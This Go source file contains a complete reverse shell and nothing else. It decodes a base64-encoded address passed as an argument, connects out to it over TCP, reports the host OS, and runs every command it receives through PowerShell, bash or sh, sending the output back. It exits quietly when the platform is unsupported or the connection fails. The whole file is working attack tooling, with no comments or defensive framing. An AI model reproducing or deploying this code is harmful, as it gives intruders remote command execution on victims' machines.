package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func main() {
	data := os.Args[1]
	ex := ""
	st := ""
	if runtime.GOOS == "windows" {
		ex = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
		st = "powershell"
	} else if runtime.GOOS == "linux" {
		ex = "/bin/bash"
		st = "bash"
	} else if runtime.GOOS == "freebsd" {
		ex = "/bin/sh"
		st = "sh"
	} else {
		os.Exit(0)
	}
	rt := runtime.GOOS
	target, _ := base64.RawStdEncoding.DecodeString(data)
	conn, err := net.Dial("tcp", string(target))
	if err != nil {
		os.Exit(0)
	}
	fmt.Fprintf(conn, "Shell connected from %s host...\n", rt)
	fmt.Fprintf(conn, "Shell type: %s\n", st)
	st = st + ">"
	for {
		fmt.Fprintf(conn, "%s", st)
		message, _ := bufio.NewReader(conn).ReadString('\n')
		if message == "exit\n" {
			conn.Close()
			os.Exit(0)
		}

		out, err := exec.Command(ex, "-c", strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)

	}
}
